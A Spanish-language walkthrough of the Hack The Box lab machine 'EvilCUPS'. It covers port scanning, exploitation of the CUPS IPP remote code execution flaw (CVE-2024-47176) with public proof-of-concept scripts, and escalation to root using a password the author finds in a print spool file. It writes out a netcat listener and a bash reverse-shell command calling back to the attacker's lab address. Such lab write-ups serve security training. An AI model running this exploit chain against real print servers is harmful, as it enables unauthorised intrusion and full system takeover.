# EvilCUPS

Tags: [[_cve]],[[_webExploitation]],[[_analysis]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Linux</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
<span style="color:#07b4f2">Buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>, <span style="color:#bef202">un posible</span> <span style="color:#ecacb6">Debian</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

<span style="color:#ff669c">22</span> - SSH. <span style="color:#379075">Version 9.2p1</span>
<span style="color:#ff669c">631</span> - IPP. <span style="color:#379075">CUPS 2.4</span>

<span style="color:#ff2dc0">UDP</span>.
<span style="color:#ff669c">68</span> - DHCP client.
<span style="color:#ff669c">631</span> - IPP.
<span style="color:#ff669c">5353</span> - Multicast DNS.


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff2dc0">General</span>.
<span style="color:#07b4f2">No</span> figura ningún <span style="color:#07b4f2">otro</span> <span style="color:#ff669c">puerto</span> <span style="color:#07b4f2">mas</span> que el <span style="color:#ff669c">22</span> y <span style="color:#ff2dc0">631</span>, pero por <span style="color:#ff2dc0">TCP</span>, <span style="color:#07b4f2">no</span> nos <span style="color:#07b4f2">olvidemos</span> de <span style="color:#ff2dc0">UDP</span>.


<span style="color:#ff2dc0">TCP</span>.
<span style="color:#ff669c">22</span>.
<span style="color:#07b4f2">No tengo</span> <span style="color:#ff2dc0">credenciales</span> de momento.

<span style="color:#ff669c">631</span>.
<span style="color:#ff2dc0">Sistema</span> de <span style="color:#07b4f2">impresión</span>.
<span style="color:#07b4f2">Una</span> implementación de <span style="color:#ff2dc0">IPP</span> <span style="color:#07b4f2">es</span> <span style="color:#ff2dc0">CUPS</span>.
<span style="color:#07b4f2">Acepta</span> solicitudes por <span style="color:#ff2dc0">POST</span>. La hago y <span style="color:#07b4f2">responde</span> un <span style="color:#ff2dc0">HTML</span>, me <span style="color:#07b4f2">dice</span> que <span style="color:#07b4f2">vaya</span> al <span style="color:#ff2dc0">HTTPS</span> por el <span style="color:#07b4f2">mismo</span> <span style="color:#ff669c">puerto</span>, se ve la <span style="color:#ff2dc0">web</span>.

<span style="color:#ff2dc0">OpenPrinting</span> <span style="color:#ecacb6">CUPS 2.4.2</span>
Investigando vemos <span style="color:#07b4f2">varias cosas</span>
+<span style="color:#07b4f2">Generar</span> un <span style="color:#ff2dc0">PostScript Printer Description</span> (PPD) file.
+También hay <span style="color:#07b4f2">algo</span> de <span style="color:#ff2dc0">BoF</span>.


Al final <span style="color:#07b4f2">utilizamos</span> la de <span style="color:#07b4f2">crear</span> un <span style="color:#ff2dc0">PPD</span>.
https://letsdefend.io/blog/openprinting-cups-rce-analysis-and-poc-cve-2024-47176 :    ya <span style="color:#07b4f2">probamos</span>, y el <span style="color:#ff2dc0">servidor IPP</span> es <span style="color:#ff2dc0">vulnerable</span>, <span style="color:#07b4f2">me hace </span>un <span style="color:#ff2dc0">callback</span>.

En este punto podríamos <span style="color:#07b4f2">crear</span> un <span style="color:#ff2dc0">IPP server</span>, <span style="color:#07b4f2">con esto</span> por ejemplo https://github.com/h2g2bob/ipp-server, monto el servidor.
Para <span style="color:#ff2dc0">ejecutar</span> el <span style="color:#07b4f2">siguiente</span> <span style="color:#ff2dc0">script</span> https://gist.github.com/stong/c8847ef27910ae344a7b5408d9840ee1 (<span style="color:#379075">ya corre el server IPP, para no tener que montarlo manual</span>).

Como habíamos <span style="color:#07b4f2">visto</span> (<span style="color:#379075">unas pruebillas</span>) la <span style="color:#07b4f2">impresora</span> que <span style="color:#07b4f2">añadimos</span> ya <span style="color:#07b4f2">figura</span> en <span style="color:#ecacb6">/printers</span>, sería <span style="color:#07b4f2">cuestión</span> de <span style="color:#07b4f2">esperar</span> a que un<span style="color:#07b4f2"> usuario utilice</span> la <span style="color:#07b4f2">impresora</span> para que se <span style="color:#ff2dc0">ejecute</span> el <span style="color:#ff2dc0">comando</span>, <span style="color:#07b4f2">o</span> en su defecto, <span style="color:#07b4f2">darle</span> a <span style="color:#ecacb6">Print Test Page</span>  (<span style="color:#379075">Imprimir una Hoja de Prueba</span>).
Y pa deeentro.

---
<span style="color:#bef202">Notas</span>.
<span style="color:#ecacb6">1.-</span> 
Da unos <span style="color:#07b4f2">problemas</span> a la hora de <span style="color:#07b4f2">darle</span> a <span style="color:#ecacb6">Print Test Page</span>, quizás porque <span style="color:#07b4f2">debo tener</span> las <span style="color:#ecacb6">librerías</span> necesarias de <span style="color:#ff2dc0">python</span>.

<span style="color:#07b4f2">También modifiqué</span> una <span style="color:#ff2dc0">función</span> del <span style="color:#ff2dc0">script</span>. <span style="color:#ecacb6">send_browsed_packet(...)</span>
<span style="color:#379075">Aunque no hace falta</span>.
![[Pasted image 20241019194458.png]]

<span style="color:#07b4f2">Probamos</span> también con <span style="color:#07b4f2">este</span> https://github.com/IppSec/evil-cups/tree/main :    es <span style="color:#07b4f2">con el que</span> me <span style="color:#07b4f2">funcionó</span> (<span style="color:#379075">seguro que el comando lo enviaba mal</span>). 
<span style="color:#88c425">nc -nlvp 443</span> :    <span style="color:#ff2dc0">listener</span>.
<span style="color:#88c425">python3 evilcups.py 10.10.14.17 10.10.11.40 "bash -c 'bash -i >& /dev/tcp/10.10.14.17/443 0>&1'"</span> :    lo <span style="color:#ff2dc0">independizamos</span> <span style="color:#07b4f2">del</span> <span style="color:#ff2dc0">proceso padre</span> que es la <span style="color:#07b4f2">impresora</span>.


<span style="color:#ecacb6">2.-</span>
Todo nace aquí.
https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/

---

<span style="color:#ff2dc0">UDP</span>.
<span style="color:#ff669c">68</span>.

<span style="color:#ff669c">631</span>.

<span style="color:#ff669c">5353</span>.
Tiene la <span style="color:#07b4f2">funcionalidad</span> como un <span style="color:#ff2dc0">DNS</span>.


## Escalada

Enumerar todo el sistema.
Efectivamente, Debian.

<span style="color:#07b4f2">Usuarios</span> válidos a <span style="color:#ff2dc0">nivel</span> de <span style="color:#ff2dc0">sistema</span>.
<span style="color:#ecacb6">root</span>
<span style="color:#ecacb6">htb</span>
<span style="color:#ecacb6">lp</span> -> como el que estoy, tiene <span style="color:#ff2dc0">nologin</span>.


<span style="color:#07b4f2">Investiguemos</span> acerca de <span style="color:#ff2dc0">CUPS</span>.
Hay varias <span style="color:#ff2dc0">rutas</span> <span style="color:#07b4f2">de</span> <span style="color:#ff2dc0">cups</span>, hay una interesante
<span style="color:#ecacb6">/var/spool/cups</span> :    <span style="color:#07b4f2">no</span> tenemos <span style="color:#ff2dc0">permisos</span>, vamos <span style="color:#07b4f2">atrás</span>.
Investigando, es posible <span style="color:#07b4f2">llegar</span> a<span style="color:#07b4f2"> ver algo de</span> las <span style="color:#07b4f2">impresoras</span> https://stackoverflow.com/questions/53688075/how-to-dissect-a-cups-job-control-file-var-spool-cups-cnnnnnn

<span style="color:#88c425">cat /var/spool/cups/d00001-001</span> :    vemos <span style="color:#07b4f2">información</span>. <span style="color:#07b4f2">Si no</span>, lo podemos <span style="color:#07b4f2">traer</span> a <span style="color:#07b4f2">mi</span> <span style="color:#ff2dc0">máquina</span> y hacerle un <span style="color:#ff2dc0">strings</span>.

Vemos una <span style="color:#07b4f2">contraseña</span>.
<span style="color:#ecacb6">Br3@k-G!@ss-r00t-evilcups</span>
La <span style="color:#07b4f2">probamos</span> con <span style="color:#ff2dc0">root</span> y pa deeeentro.

FIN.
